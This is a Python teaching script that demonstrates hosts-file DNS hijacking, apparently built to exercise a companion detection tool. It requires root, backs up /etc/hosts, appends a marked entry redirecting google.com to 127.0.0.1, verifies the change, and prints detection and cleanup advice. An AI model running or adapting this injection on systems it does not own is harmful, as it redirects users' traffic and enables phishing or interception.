#!/usr/bin/env python3
"""
poison_cache.py - DNS Cache Poisoning Attack Demonstration

OS CONCEPTS DEMONSTRATED:
-------------------------
1. /etc/hosts File: Local DNS resolution file that overrides DNS queries
2. Privilege Escalation: Requires root/sudo to modify system files
3. DNS Resolution Order: hosts file is checked before DNS servers
4. File Permissions: Understanding root-protected system files
5. Attack Persistence: Changes persist until manually reverted

EXPLOIT MECHANISM:
------------------
This script demonstrates a DNS cache poisoning attack by injecting malicious
entries into /etc/hosts. This redirects legitimate domain names to attacker-
controlled IP addresses (in this demo, localhost 127.0.0.1).

Real-world implications:
- Phishing attacks (redirect bank.com to fake site)
- Man-in-the-middle attacks
- Denial of service (redirect to invalid IPs)
- Certificate bypass attacks

EDUCATIONAL PURPOSE ONLY: Demonstrates DNS hijacking for learning.
Never perform unauthorized modifications to system files.
"""

import os
import sys
import time
import shutil
from datetime import datetime

# ANSI color codes
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


def print_banner():
    """Display exploit script banner"""
    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("=" * 70)
    print("  DNS Cache Poisoning Attack - /etc/hosts Injection")
    print("  Educational Demonstration - Phase 4")
    print("=" * 70)
    print(f"{Colors.ENDC}")


def check_root_privileges():
    """
    Check if script is running with root privileges

    OS Concept: /etc/hosts is a system file owned by root, requiring
    elevated privileges to modify. Regular users cannot write to it.
    """
    if os.geteuid() != 0:
        print(f"{Colors.RED}[!] Error: This script requires root privileges{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] /etc/hosts is protected and can only be modified by root{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] Please run: sudo python3 {sys.argv[0]}{Colors.ENDC}")
        return False

    print(f"{Colors.GREEN}[+] Running with root privileges{Colors.ENDC}")
    return True


def backup_hosts_file(hosts_path="/etc/hosts"):
    """
    Create backup of original /etc/hosts file

    OS Concept: Always backup system files before modification.
    This allows recovery in case of errors or for forensic analysis.
    """
    try:
        backup_path = f"{hosts_path}.backup.{int(time.time())}"
        shutil.copy2(hosts_path, backup_path)
        print(f"{Colors.GREEN}[+] Created backup: {backup_path}{Colors.ENDC}")
        return backup_path
    except Exception as e:
        print(f"{Colors.RED}[!] Error creating backup: {e}{Colors.ENDC}")
        return None


def read_current_hosts(hosts_path="/etc/hosts"):
    """Read current contents of /etc/hosts"""
    try:
        with open(hosts_path, 'r') as f:
            return f.read()
    except Exception as e:
        print(f"{Colors.RED}[!] Error reading {hosts_path}: {e}{Colors.ENDC}")
        return None


def inject_malicious_entry(hosts_path="/etc/hosts", target_domain="google.com", redirect_ip="127.0.0.1"):
    """
    Inject malicious DNS entry into /etc/hosts

    OS Concept: The /etc/hosts file format:
    - Each line: <IP_ADDRESS> <HOSTNAME> [ALIASES...]
    - Lines starting with # are comments
    - Entries are checked before DNS queries
    - First match wins (order matters)

    Attack Vector:
    - Adding "127.0.0.1 google.com" redirects Google to localhost
    - This bypasses DNS entirely
    - Affects all applications on the system
    """
    try:
        # Read current contents
        current_content = read_current_hosts(hosts_path)
        if current_content is None:
            return False

        # Check if entry already exists
        if target_domain in current_content and redirect_ip in current_content:
            print(f"{Colors.YELLOW}[*] Malicious entry may already exist{Colors.ENDC}")

        # Create malicious entry with clear marker
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        malicious_entry = f"\n# MALICIOUS ENTRY - DNS Cache Poisoning Attack - {timestamp}\n"
        malicious_entry += f"{redirect_ip}    {target_domain}\n"
        malicious_entry += f"# This entry redirects {target_domain} to {redirect_ip}\n"
        malicious_entry += f"# This is an educational demonstration of DNS hijacking\n"

        # Append to hosts file
        with open(hosts_path, 'a') as f:
            f.write(malicious_entry)

        print(f"{Colors.GREEN}[+] Successfully injected malicious entry{Colors.ENDC}")
        print(f"{Colors.CYAN}    {redirect_ip} -> {target_domain}{Colors.ENDC}")
        return True

    except PermissionError:
        print(f"{Colors.RED}[!] Permission denied: Cannot modify {hosts_path}{Colors.ENDC}")
        return False
    except Exception as e:
        print(f"{Colors.RED}[!] Error injecting entry: {e}{Colors.ENDC}")
        return False


def verify_injection(target_domain="google.com"):
    """
    Verify that DNS poisoning was successful

    OS Concept: Use 'getent hosts' or 'ping' to test DNS resolution.
    These tools respect /etc/hosts entries.
    """
    print(f"\n{Colors.BOLD}--- Verification ---{Colors.ENDC}")

    try:
        import subprocess

        # Try using getent to resolve the domain
        result = subprocess.run(
            ['getent', 'hosts', target_domain],
            capture_output=True,
            text=True,
            timeout=5
        )

        if result.returncode == 0:
            resolved_ip = result.stdout.split()[0]
            print(f"{Colors.CYAN}[*] DNS Resolution Test:{Colors.ENDC}")
            print(f"    Domain: {target_domain}")
            print(f"    Resolves to: {resolved_ip}")

            if resolved_ip == "127.0.0.1":
                print(f"{Colors.GREEN}[+] DNS poisoning successful! Domain redirects to localhost{Colors.ENDC}")
                return True
            else:
                print(f"{Colors.YELLOW}[*] Domain resolves to {resolved_ip} (not poisoned){Colors.ENDC}")
                return False
        else:
            print(f"{Colors.YELLOW}[*] Could not verify DNS resolution{Colors.ENDC}")
            return False

    except Exception as e:
        print(f"{Colors.YELLOW}[*] Verification error: {e}{Colors.ENDC}")
        return False


def demonstrate_attack_impact(target_domain="google.com"):
    """Demonstrate the impact of DNS cache poisoning"""
    print(f"\n{Colors.BOLD}--- Attack Impact Analysis ---{Colors.ENDC}")

    print(f"\n{Colors.YELLOW}What this attack accomplishes:{Colors.ENDC}")
    print(f"  1. All DNS queries for '{target_domain}' now redirect to 127.0.0.1")
    print(f"  2. Web browsers, applications, and system tools are affected")
    print(f"  3. Attack persists until /etc/hosts is manually cleaned")
    print(f"  4. No network traffic to real {target_domain} - complete hijacking")

    print(f"\n{Colors.YELLOW}Real-world attack scenarios:{Colors.ENDC}")
    print(f"  • Phishing: Redirect bank.com to fake login page")
    print(f"  • MITM: Redirect traffic through attacker's proxy")
    print(f"  • DoS: Redirect services to invalid IPs")
    print(f"  • Data theft: Intercept credentials and sensitive data")

    print(f"\n{Colors.YELLOW}OS Security Implications:{Colors.ENDC}")
    print(f"  • Root access allows complete system compromise")
    print(f"  • File integrity monitoring is critical")
    print(f"  • Audit logging helps detect unauthorized changes")
    print(f"  • Backup and recovery procedures are essential")

    print(f"\n{Colors.YELLOW}Detection Methods:{Colors.ENDC}")
    print(f"  • File integrity monitoring (inotify, AIDE, Tripwire)")
    print(f"  • Audit logs (auditd) tracking /etc/hosts modifications")
    print(f"  • Periodic checksum verification")
    print(f"  • Real-time monitoring (Phase 4 detection engine)")


def show_cleanup_instructions(backup_path=None):
    """Show how to clean up the malicious entry"""
    print(f"\n{Colors.BOLD}--- Cleanup Instructions ---{Colors.ENDC}")
    print(f"\n{Colors.CYAN}To remove the malicious entry:{Colors.ENDC}")
    print(f"  1. Edit /etc/hosts manually:")
    print(f"     {Colors.BOLD}sudo nano /etc/hosts{Colors.ENDC}")
    print(f"     Remove lines marked as 'MALICIOUS ENTRY'")
    print()

    if backup_path:
        print(f"  2. Or restore from backup:")
        print(f"     {Colors.BOLD}sudo cp {backup_path} /etc/hosts{Colors.ENDC}")
        print()

    print(f"  3. Verify cleanup:")
    print(f"     {Colors.BOLD}getent hosts google.com{Colors.ENDC}")
    print(f"     Should NOT resolve to 127.0.0.1")
    print()


def main():
    """Main exploit execution flow"""
    print_banner()

    # Configuration
    HOSTS_FILE = "/etc/hosts"
    TARGET_DOMAIN = "google.com"
    REDIRECT_IP = "127.0.0.1"

    print(f"{Colors.CYAN}[*] Target file: {HOSTS_FILE}{Colors.ENDC}")
    print(f"{Colors.CYAN}[*] Target domain: {TARGET_DOMAIN}{Colors.ENDC}")
    print(f"{Colors.CYAN}[*] Redirect IP: {REDIRECT_IP}{Colors.ENDC}")
    print()

    # Check root privileges
    if not check_root_privileges():
        return 1

    print()

    # Warn user
    print(f"{Colors.YELLOW}{'='*70}{Colors.ENDC}")
    print(f"{Colors.YELLOW}{Colors.BOLD}WARNING: This will modify your system's /etc/hosts file!{Colors.ENDC}")
    print(f"{Colors.YELLOW}This is an educational demonstration of a DNS cache poisoning attack.{Colors.ENDC}")
    print(f"{Colors.YELLOW}{'='*70}{Colors.ENDC}")
    print()

    # Confirm
    try:
        response = input(f"{Colors.BOLD}Continue with attack demonstration? (yes/no): {Colors.ENDC}")
        if response.lower() not in ['yes', 'y']:
            print(f"{Colors.YELLOW}[*] Attack cancelled by user{Colors.ENDC}")
            return 0
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Attack cancelled by user{Colors.ENDC}")
        return 0

    print()

    # Backup original file
    print(f"{Colors.BLUE}[*] Creating backup of {HOSTS_FILE}...{Colors.ENDC}")
    backup_path = backup_hosts_file(HOSTS_FILE)
    if not backup_path:
        print(f"{Colors.RED}[!] Failed to create backup. Aborting for safety.{Colors.ENDC}")
        return 1

    print()

    # Inject malicious entry
    print(f"{Colors.BLUE}[*] Injecting malicious DNS entry...{Colors.ENDC}")
    success = inject_malicious_entry(HOSTS_FILE, TARGET_DOMAIN, REDIRECT_IP)

    if not success:
        print(f"{Colors.RED}[!] Failed to inject malicious entry{Colors.ENDC}")
        return 1

    print()

    # Verify
    verify_injection(TARGET_DOMAIN)

    # Show impact
    demonstrate_attack_impact(TARGET_DOMAIN)

    # Cleanup instructions
    show_cleanup_instructions(backup_path)

    # Summary
    print(f"\n{Colors.BOLD}{'='*70}{Colors.ENDC}")
    print(f"{Colors.GREEN}{Colors.BOLD}[+] DNS Cache Poisoning Attack Demonstration Complete!{Colors.ENDC}")
    print(f"{Colors.YELLOW}[*] The malicious entry has been injected into {HOSTS_FILE}{Colors.ENDC}")
    print(f"{Colors.YELLOW}[*] Phase 4 detection engine (monitor.py) should detect this change{Colors.ENDC}")
    print(f"{Colors.RED}[!] Remember to clean up when done with demonstration{Colors.ENDC}")
    print(f"{Colors.BOLD}{'='*70}{Colors.ENDC}")

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Attack interrupted by user{Colors.ENDC}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unexpected error: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
